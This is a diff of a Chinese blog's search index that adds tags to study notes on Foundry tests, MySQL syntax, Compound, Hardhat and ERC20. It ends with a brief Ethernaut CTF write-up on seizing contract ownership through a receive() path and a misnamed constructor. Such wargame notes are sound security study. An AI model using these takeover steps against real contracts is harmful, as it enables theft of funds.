提供的标准库包括各种实用的工具和功能，例如，向指定账户发送代币</p></blockquote><p>在Forge标准库的测试合约中，通过vm实例可以方便的访问作弊码<br>例如：身份转化：vm.prank;使用vm.prank()函数，我们可以暂时切换调用者的身份</p><h2 id="编写测试合约"><a href="#编写测试合约" class="headerlink" title="编写测试合约"></a>编写测试合约</h2><p>必要工作，导入：import “forge-std&#x2F;Test.sol”<br>setUP函数，是一个可选函数，在运行测试用例之前调用，用于初始化测试环境<br>以test为前缀的函数将被识别为测试用例并执行<br>testFail函数，用于指示预期的测试失败，如果此函数未触发还原，则测试失败</p><p>还有一些高级的测试技术：expectRevert：它是进行精准的错误处理，例如,vm.expectRevert(Some.Error.selector) &#x2F;&#x2F;可触发SomeError一些错误</p><p>共享设置：通过创建抽象合约并在测试合约中继承它，可以设置共享：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract contract SetupHelper &#123;</span><br><span class="line">    // Shared setup codes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyTest is Test, SetupHelper &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // Shared setup</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过共享设置可以避免在每个测试合约中重复相同的初始化代码，提高代码的可重用性和可维护性</p><p>导入文件，用<br>import “forge-std&#x2F;Test.sol”<br>这个是必要的</p>]]></content>
       
       
       
@@ -155,6 +212,12 @@
       
       
       
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -167,6 +230,12 @@
         <content type="html"><![CDATA[<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>1，数据是数据库储存的基本对象，而数据库则是长期储存在计算机中，有组织，可共享的大量数据的集合<br>   基本特点：永久储存，有组织，可共享，冗余度小，易扩展<br>2，一些基本模型术语：</p><ul><li>关系（r）：就是一个整体的表，可对关系的描述:关系名 (属性1，属性2…..)；关系名就是表名；<ul><li>关系完整性约束条件：实体，参照，用户定义完整性</li></ul></li><li>属性：表中的一列为一个属性</li><li>域：属性的取值范围，一个具有相同类型的值集合</li><li>元组（t）：表中的一行</li><li>主码：也叫码键，表中的某个属性组，它可以唯一确定一个元组，就是一个比较特殊可以用它来确定唯一的值，有点类似于c中的指针；</li><li>分量：元组中的一个属性值</li><li>关系模式：对关系的描述，也叫联系<br>3，数据库系统里有三种模式：<br>a,模式（逻辑模式，概念模式）：数据库中的全体数据逻辑结构和特征的描述，与物理储存的细节和硬件环境，与具体的应用程序，开发环境及高级程序设计语言无关，它是数据库系统模式的中间层<br>b，外模式（子模式，用户模式）：数据库用户使用的局部数据的逻辑结构和特征的描述，是与某一应用有关的数据的逻辑表示，<strong>每个用户</strong>只能看见和访问对应的外模式中的数据，用户只能与外模式建立联系<br>c，内模式（储存模式，物理模式）：是数据物理结构和储存方式的描述，是数据在数据库内部的表示方式：记录的储存方式，索引的组织方式，数据是否压缩储存，数据是否加密，数据储存记录记录结构的规定<blockquote><p>用户-外模式-模式-内模式</p></blockquote></li></ul><p>4，二级映像，三级模式<br>4，<strong>E-R图</strong>：实体用方框，属性用椭圆，关系用菱形</p><hr><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="基本含义："><a href="#基本含义：" class="headerlink" title="基本含义："></a>基本含义：</h3><p>数据模型组成的三要素：数据结构，数据操作，数据的完整性约束条件<br>数据库(DB)：储存数据的仓库<br>数据库管理系统（DBMS）<br>数据库系统（DBS）：包含了数据库和数据库管理系统<br>型：对某一类数据的结构和属性的说明，值：对型的一个具体赋值<br>笛卡尔积：域的相乘，就是域之间的排列组合<br>基数：一个域允许的不同取值的个数。如域d1,的基数为2，域d2的基数为3，则总基数为2*3&#x3D;6；<br>MySQL: 操纵何管理数据库的软件，下载安装后，在终端打开，用：net start mysql80,停止用：net stop mysql80<br>MySQL数据库模型：<br>1，关系型数据库（RDBMS）：建立在关系型模型基础上，由多张相互连接的二维表组成的数据库<br> <a href="http://www.mysql.com/">下载安装MySQL</a><br> 1,登录数据库命令：cd  C:\Program Files\MySQL\MySQL Server 8.0\bin（由于我配置了环境变量，所这步可以省略）<br> 2, 客户端连接，输入mysql -h localhost -u root -p,进入数据库,也可以直接在开始直接打开MySQL的命令提示板输入密码即可<br> 3,输入show databases; 查看当前数据库列表<br> 4,退出执行命令：exit或者quit</p><blockquote><p>一些专业的名词解释：1，索引：加快查询速度的有效方式，用户可以在基本表上建立一个或者多个索引，以提供存取路径，索引是属于内模式的范畴。唯一的索引：使用UNIQUE关键字，每个索引值对应唯一一条数据记录 2，视图：视图是从一个或者几个基本表导出的表，数据库只存在视图的定义而不是存放视图对应的数据，基本表中的数据发生变化，从视图查询出的数据也会随之变化。</p></blockquote><h3 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h3><p>SQL：是用于管理数据库的标准化编程语言，它用于查询，更新，插入和删除数据库中的数据，操作数据库的语言，不管什么数据库管理系统（DBMS），SQL都实用<br>以下所写都是用的关系模型；</p><h4 id="一，SQL的通用语法："><a href="#一，SQL的通用语法：" class="headerlink" title="一，SQL的通用语法："></a>一，SQL的通用语法：</h4><p>a，可单行或多行书写，一分号结尾<br>b,可以使用空格或者缩进来增强语句的可读性<br>c,MySQL数据库的SQL语句部区分大小写，关键字建议大写<br>d,注释：</p><ul><li>单行注释：– 注释内容或 #注释内容（MySQL特有）</li><li>多行注释：&#x2F;* 注释内容*&#x2F;</li></ul><h4 id="二，SQL的分类："><a href="#二，SQL的分类：" class="headerlink" title="二，SQL的分类："></a>二，SQL的分类：</h4><h5 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h5><p>1，DDL：数据定义语言，用来定义数据库对象（数据库，表，字段）</p><p>a,DDL-数据库操作：</p><ul><li>查询：<ul><li>查询所有数据库：SHOW DATABASES；</li><li>查询当前数据库：SELECT DATABASE();</li></ul></li><li>创建：<ul><li>CREATE DATABASE[IF NOT EXISTS]数据库名[DEFAULT CHARSET 字符集] [COLLATE 排序规则]；<blockquote><p>括号代表可以有的，eg:CREATE DATABASE IF NOT EXISTS itcast DEFAULT CHARSET utf8mb4;也可以直接创建CREATE DATABASE itcast;</p></blockquote></li></ul></li><li>删除：<ul><li>DROP DATABASE[IF EXISTS]数据库名；</li></ul></li><li>使用：<ul><li>USE 数据库名；顾名思义切换到一个数据库中</li></ul></li></ul><p>b,DDL-表操作</p><ul><li>查询<ul><li>查询当前数据库所有表：SHOW TABLES;</li><li>查询表的结构：DESC 表名；</li><li>查询指定表的建表语句 SHOW CREATE TABLE 表名；</li></ul></li><li>创建<ul><li>CREATE TABLE 表名（<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段n 字段类型 COMMENT 字段n注释<br>）[COMMENT 表注释] ；<br>（注意：最后一个字段没有逗号，字段的注释必须用’’围住,可以先在记事本上写，然后直接复制）<br>mysql&gt; CREATE TABLE tb_user(<br>-&gt; id int COMMENT ‘编号’<br>-&gt; ) COMMENT ‘用户表’;</li></ul></li></ul><p>c,DDL-表操作-数据类型</p><ul><li>数值类型（参照Java）<ul><li>TINYINT(1byte)，SMALLINT(2bytes),MEDIUMINT(3bytes)，INT(4bytes),BIGINT(8bytes),FLOAT(4bytes),DOUBLE(8bytes)</li><li>有符号（SIGNED），范围有负数，无符号（UNSIGNED），范围无负数，eg:TINYINT 有符号：-128<del>127，无符号：0</del>255；</li><li>举例：年龄：age TINYINT UNSIGNED；分数：score DOUBLE(4,1)，4为标度，总共的数字个数，1为精度，小数的位数</li></ul></li><li>字符串类型<ul><li>CHAR ：定长字符串；VARCHAR：变长字符串；TEST:长文本数据；</li><li>CHAR(10),性能好；VARCHAR(10)</li></ul></li><li>日期时间类型<ul><li>DATE:范围：1000-01-01至9999-12-31，格式：YYYY-MM-DD  日期值  eg:brithday DATE</li><li>TIME:范围：-838：59：59至838：59：59，格式：HH:MM:SS  时间值</li><li>YEAR:范围：1901至2155   格式：YYYY 年份值</li><li>DATETIME:混合日期和时间 格式：YYYY-MM-DD HH-MM-SS</li><li>TIMESTAMP :混合日期和时间，时间戳 格式：YYYY-MM-DD HH-MM-SS</li></ul></li></ul><p>d,DDL-表操作-修改</p><ul><li>添加字段：ALTER TABLE 表名 ADD 字段名 类型（长度）[COMMENT 注释] [约束 ]；</li><li>修改字段<ul><li>修改数据类型 ： ALTER TBALE 表名 字段名 新数据类型（长度）；</li><li>修改字段名，字段类型 ：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型（长度）[COMMENT 注释] [约束 ]；</li></ul></li><li>删除字段 : ALTER TABLE 表名 DROP 字段名；</li><li>修改表名 ：ALTER TABLE 表名 RENAME TO 新表名；</li><li>删除：<ul><li>删除表 ：DROP TABLE [IF EXISTS]表名；</li><li>删除指定表，并重新创建该表 : TRUNCATE TABLE 表名；（一般不使用它，因为它会重新创建该表，只是没有结构）<br>MySQL 图形化界面：DataGrip,使用它就可以直接写了</li></ul></li></ul><hr><h5 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h5><p>2，DML：数据操作语言，用来对数据库表中的数据进行修改  涉及的关键字：INSERT INTO<br>a,DML-添加数据：</p><ul><li>给指定字段添加数据：INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…）；</li><li>给全部字段添加数：INSERT INTO 表名 VALUES（值1，值2…）；值1，就是表中第一列</li><li>批量添加数据：<ul><li>INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…），（值1，值2…），（值1，值2…）；</li><li>INSERT INTO 表名 VALUE(值1，值2)，（值1，值2…）（值1，值2…）；<br>b，DML-修改数据</li></ul></li><li>UPDATE 表名 SET 字段名1 &#x3D; 值1，字段名2 &#x3D; 值2，…[WHERE 条件]；<br>c,DML-删除数据</li><li>DELETE FROM 表名 [WHERE 条件]；</li></ul><hr><h5 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h5><p>3，DQL：数据查询语言，用来查询数据库中的表的记录   涉及的关键字：SELECT</p><p>a,DQL-语法（也是编写顺序）：<br>SELECT<br>       字段列表<br>FROM<br>       表名列表<br>WHERE<br>       条件列表<br>GROUP BY<br>       分组字段列表<br>HAVING<br>       分组后条件列表<br>ORDER BY<br>       排序字段列表<br>LIMIT<br>       分页参数</p><p>b,DQL-基本查询</p><ul><li>查询多个字段<ul><li>SELECT 字段1，字段2，字段3…. FROM 表名；</li><li>SELECT *FROM 表名；查询所有字段</li></ul></li><li>设置别名：SELECT 字段1[AS 别名1]，字段2[AS 别名2]…FROM 表名；</li><li>去除重复记录：SELECT DISTINCT 字段列表 FROM 表名；<br>c,DQL-条件查询</li><li>语法：SELECT 字段列表 FROM 表名 WHERE 条件列表；</li><li>条件：where后面可以跟比较运算符（&gt;,&lt;,!&#x3D;,is NULL,BETWEEN    AND ，IN(),LIKE 占位符 _ % ）和逻辑运算符（AND ,&amp;&amp;,OR,||,NOT,!）</li><li>in(),就是括号里的条件任意满足其一即可，between最小值 and 最大值,like 模糊匹配 下划线_占一个字符，百分号% h后跟谁查谁，最后一个字符，例如查询名字为俩个字的员工：like ‘_ _’;  例如查身份证最后一个字符为X：like ‘%x’;</li></ul><p>c,DQL-聚合函数</p><ul><li>介绍：将一列数据作为一个整体，进行纵向计算</li><li>常见的聚合函数<ul><li>count ：统计数量</li><li>max :最大值</li><li>min : 最小值</li><li>avg : 平均值</li><li>sum : 求和</li></ul></li><li>语法<ul><li>SELECT 聚合函数（字段列表）FROM 表名；</li></ul></li></ul><p>d,DQL-分组查询</p><ul><li>语法：SELECT 字段列表 FROM 表名[WHERE 条件] GROUP BY 分组字段名 [HAVING 分组后过滤条件]；</li><li>where与having区别：<ul><li>执行时机不同：where是分组前进行过滤，不满足where条件，不参与分组；而having是分组后对结果进行过滤</li><li>判断条件不同：where不能对聚合函数进行判断，而having可以；</li><li>注意事项：执行顺序：where&gt;聚合函数&gt;having; 分组后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</li></ul></li></ul><p>e,DQL-排序查询</p><ul><li>语法: SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1，字段2，排序方式二；</li><li>排序方式：<ul><li>ASC: 升序（默认值）</li><li>DESC: 降序</li></ul></li></ul><p>f,DQL-分页查询</p><ul><li>语法：SELECT 字段列表 FROM 表名 LIMIT 起始索引，查询记录数；</li><li>注意：<ul><li>起始索引从零开始，起始索引 &#x3D; （查询页码-1）*每页显示记录数</li><li>分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中式LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接写limit 10</li></ul></li></ul><p>h,DQL-执行顺序<br> FROM<br>    表名列表<br>WHERE<br>    条件列表<br>GROUP BY<br>     分组字段列表<br>HAVING<br>     分组后条件列表<br>SELECT<br>     字段列表<br>ORDER BY<br>     排序字段列表<br>LIMIT<br>     分页参数</p><hr><h5 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h5><p>4，DCL：数据控制语言，用来创建数据库用户，控制数据库的访问权限,就是控制有那些用户可以访问数据库</p><p>a,DCL-用户管理</p><ul><li>查询用户：USE mysql; SELECT *FROM user;</li><li>创建用户：CREATE USER ‘用户名‘@’主机名’ IDENTIFIED BY ‘密码’；</li><li>修改用户密码：ALTER USER ‘用户名‘@’主机名’ IDENTIFIED WITH mysql_native_password BY ‘新密码’；</li><li>删除用户：DROP USER ‘用户名‘@’主机名’；</li><li>主机名：localhost 代表只能在当前主机访问数据库，% 代表可以在任意主机上访问数据库；</li></ul><p>b,DCL-控制权限</p><ul><li>ALL ,ALL PRIVILEGES : 所有权限</li><li>SELECT : 查询数据</li><li>INSERT ：插入数据</li><li>UPDATE : 修改数据</li><li>DELETE : 删除数据</li><li>ALTER : 修改表</li><li>DROP : 删除数据库，表，视图</li><li>CREATE : 创建数据库，表</li><li>主要使用：<ul><li>查询权限：SHOW GRANTS FOR ‘用户名‘@’主机名’；</li><li>授予权限：GRANT 授权列表 ON 数据库名.表名 TO ‘用户名‘@’主机名’;</li><li>撤销权限：REVOKE 权限列表 ON 数据库名.表名 FROM ‘用户名‘@’主机名’；</li></ul></li></ul><hr><p>（由于后面要学习solidity，所以就没有再更新数据库原理了）</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -194,6 +263,12 @@
       
       
       
+        <tags>
+            
+            <tag> EVM </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -207,6 +282,12 @@
       
       
       
+        <tags>
+            
+            <tag> EVM </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -219,6 +300,12 @@
         <content type="html"><![CDATA[<h1 id="Compound"><a href="#Compound" class="headerlink" title="Compound"></a>Compound</h1><p>Compound是在Ethereum上运行的软件，旨在奖励分布式计算机网络运行传统货币市场。Compound允许用户将加密货币存入借贷池让借款人使用。而贷方从他们存入的资产赚取利息。 </p><p>存款后，Compound会奖励贷方名为cToken（代表存款）的新加密货币。cToken的例子包括cETH、cBAT以及cDAI。</p><p>每个cToken都可无限转让或交易，但只能兑换最初锁定在协议中的加密货币。整个过程由Compound代码自动处理，代表贷方可以随时提币。</p><p>为了激励这个行为，Compound使用了另一种称为COMP的自家加密货币。每当用户和Compound市场互动时（借入、提取或偿还资产），作为奖励他们都会获得额外的COMP代币。</p><p>简言之，Compound 是一个允许用户借贷代币的智能合约，它与你的银行类似，Compound 把你的钱借给借款人，并随着时间的推移赚取利息。但与银行不同的是，你的利息是从你存入 Compound 的智能合约后开始复利计算的。因为这是一个智能合约，整个流程中没有中间人，因此利息会比传统银行要高。</p><h2 id="运作机制"><a href="#运作机制" class="headerlink" title="运作机制"></a>运作机制</h2><p>Compound 协议让开发者可以基于以太坊建立各种各样的货币市场（money market）。<br>所谓的「货币市场」，其实就是一个个的独立币池单元，每个币池里只有一种代币，协议通过算法来决定这个池子里的币借贷的利率是多少。简单点说，这个算法会基于人们对这个币借贷的供需关系自动计算出利率。</p><p>不管你是来贷款还是放贷，你都是在跟 Compound 协议直接打交道。这一点跟那些点对点的借贷协议不太一样。在点对点的方案里，借贷双方会做匹配，然后你需要跟找你借钱的人（或者借你钱的人）进行沟通，双方自己商定好借款的利率、到期时间和抵押物品等等。</p><p>而在 Compound 协议里，每个代币（比如 Ether、Dai、USDC）都有一个属于自己的借贷市场，里面包含每个用户在这个市场里的余额，以及各笔生效的借贷交易，乃至每段时期的历史利率，等等。</p><p>用户可以通过抵押品的信贷额度无缝地从协议上借钱，你只需要看自己要借哪个币，不需要和别人沟通还款日期、利率，就能马上借钱。借款是实时且可预测的。每个货币市场都有一个由市场决定的浮动利率。</p><h2 id="清算保证"><a href="#清算保证" class="headerlink" title="清算保证"></a>清算保证</h2><p>Compound 协议强制应用了一条规则，即每个账户必须拥有足够的余额能够偿还借款的额度，叫做<strong>抵押率</strong>。每个账户无法做出任何会使「余额／借款额度」低于「抵押率」的行为。比如再借更多的钱或者把抵押款的余额提现。要增大或者重置抵押率，用户可以全额或者部分偿还借款。任何被 Compound 持有的余额，包括用户用来做抵押品的余额，同时也会产生正常的应计利息。</p><p>如果一个用户提供的抵押资产，除以他们信用额度所借的款项，低于抵押率，那他们的抵押资产就会（通过借款资产）被出售，出售的价格是当前市场价格减去清算折扣（liquidation discount）。这个机制会激励系统里的套利者，去快速减少借款人还不了的借款资产的短缺，从而降低协议的风险。</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -246,6 +333,12 @@
       
       
       
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -272,6 +365,12 @@
       
       
       
+        <tags>
+            
+            <tag> 题解 </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -284,6 +383,12 @@
         <content type="html"><![CDATA[<h1 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h1><p><strong>hardhat</strong>就是以太坊开发环境，如同remix,现在介绍一下安装<strong>hardhat</strong>的步骤</p><ul><li>打开终端，win+r,输入cmd</li><li>检查node js,安装没有，<code>node -v</code> (没有安装去官网下载)</li><li>建一个文件夹，在终端输入<code>mkdir hardhat-tutorial</code>，然后进入文件夹，<code>cd hardhat-tutorial</code></li><li>进行初始化，<code>npm init</code>，接下来一直按enter,直到出现<code>Is this OK? (yes)</code>,回答yes即可</li><li>安装<strong>hardhat</strong> <code>npm install --save-dev hardhat</code>,需要等待几秒</li><li>再安装一个插件 npm install –save-dev @nomicfoundation&#x2F;hardh<br>at-toolbox<br>s</li></ul><h2 id="编写合同"><a href="#编写合同" class="headerlink" title="编写合同"></a>编写合同</h2><p>安装完成后，因为使用VScode,所以我们要安装一个VScode 安全帽，它可以帮组我们更好的使用solidity语言，然后在VScode创建一个新目录，写一个简单的.sol合约，在终端中运行该合约，<code>npx hardhat compile,</code>成功后就会看到<code>Compiled 1 Solidity file successfully (evm target: paris).</code></p><h2 id="测试合约"><a href="#测试合约" class="headerlink" title="测试合约"></a>测试合约</h2><p><code>npx hardhat test</code>,如果你想看到solidity的日志消息，合约变量，必须导入<code>hardhat/console.sol</code>合约代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再添加一些对该函数console.log的调用transfer()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Not enough tokens&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(</span><br><span class="line">        &quot;Transferring from %s to %s %s tokens&quot;,</span><br><span class="line">        msg.sender,</span><br><span class="line">        to,</span><br><span class="line">        amount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结，hardhat就是能轻松部署我们的合约、运行测试和调试 Solidity 代码，无需处理实时环境，更多知识请参考<a href="https://hardhat.org/">hardhat</a></p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> test </tag>
+            
+        </tags>
       
     </entry>
     
@@ -298,6 +403,12 @@
       
       
       
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -310,6 +421,12 @@
         <content type="html"><![CDATA[<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><code>ERC20</code>是以太坊上的代币标准，它实现了代币转账的基本逻辑：</p><ul><li>账户余额(balanceOf())</li><li>转账(transfer())</li><li>授权转账(transferFrom())</li><li>授权(approve())</li><li>代币总供给(totalSupply())</li><li>授权转账额度(allowance())</li><li>代币信息（可选）：名称(name())，代号(symbol())，小数位数(decimals())</li></ul><p>除了ERC20,还有它的接口合约IERC20，就是为了统一规范，以便好使用，接下来就介绍一下IERC20合约的功能</p><h2 id="俩个事件"><a href="#俩个事件" class="headerlink" title="俩个事件"></a>俩个事件</h2><ul><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>from</code>) 转账到另一账户 (<code>to</code>)时.<br><code>event Transfer(address indexed from, address indexed to, uint256 value);</code></li><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>owner</code>) 授权给另一账户 (<code>spender</code>）时.<br><code>event Approval(address indexed owner, address indexed spender, uint256 value);</code></li></ul><h2 id="六个函数"><a href="#六个函数" class="headerlink" title="六个函数"></a>六个函数</h2><ul><li><code>totalSupply()</code>返回代币总供给<br><code>function totalSupply() external view returns (uint256);</code></li><li><code>balanceOf()</code>返回账户<code>account</code>所持有的代币数.<br><code>function balanceOf(address account) external view returns (uint256);</code></li><li><code>transfer()</code>转账 <code>amount</code> 单位代币，从调用者账户到另一账户 <code>to</code>,如果成功，返回 <code>true</code>,释放 {Transfer} 事件.<br><code>function transfer(address to, uint256 amount) external returns (bool);</code></li><li><code>allowance()</code>返回<code>owner</code>账户授权给<code>spender</code>账户的额度，默认为0,当{approve} 或 {transferFrom} 被调用时，<code>allowance</code>会改变<br><code>function allowance(address owner, address spender) external view returns (uint256);</code></li><li><code>approve()</code>调用者账户给<code>spender</code>账户授权 <code>amount</code>数量代币,如果成功，返回 <code>true</code>,释放 {Approval} 事件<br><code>function approve(address spender, uint256 amount) external returns (bool);</code></li><li><code>transferFrom()</code>通过授权机制，从<code>from</code>账户向<code>to</code>账户转账<code>amount</code>数量代币。转账的部分会从调用者的<code>allowance</code>中扣除。 如果成功，返回 <code>true</code>. 释放 {Transfer} 事件. <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure>以上须记住，以便好用</li></ul><p>说白了，它就是以太坊发行代币的一个标准，学会了如何实现ERC20，对入门区块链是很有帮助的</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> ERC </tag>
+            
+        </tags>
       
     </entry>
     
@@ -324,6 +441,12 @@
       
       
       
+        <tags>
+            
+            <tag> 题解 </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -336,6 +459,12 @@
         <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>首先找到owner，</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，<br>这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上部署这个合约，首先调用contribute函数，给我们转账；<br>2，在调用receive函数，就完成了</p><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>从这个题目来看，Fallout,Fal1out,</p><p>分析：<br>首先看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：</p><p>定义函数接口，直接调用该函数Fal1out,此时就成为了合约的所有者</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> 题解 </tag>
+            
+        </tags>
       
     </entry>
     
